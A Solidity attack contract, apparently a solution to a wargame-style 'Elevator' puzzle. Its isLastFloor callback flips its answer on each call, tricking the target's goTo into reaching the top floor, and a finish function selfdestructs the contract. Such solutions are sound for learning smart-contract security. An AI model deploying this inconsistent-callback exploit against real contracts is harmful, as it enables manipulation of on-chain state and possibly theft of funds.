// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Building, Elevator} from "./Elevator.sol";

contract AttackElevator is Ownable, Building {
    bool internal isLast = true;

    constructor() Ownable(msg.sender) {}

    function isLastFloor(uint256) external override returns (bool) {
        isLast = !isLast;
        return isLast;
    }

    function attack(address _elevatorContract) external onlyOwner {
        Elevator(_elevatorContract).goTo(4308);
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
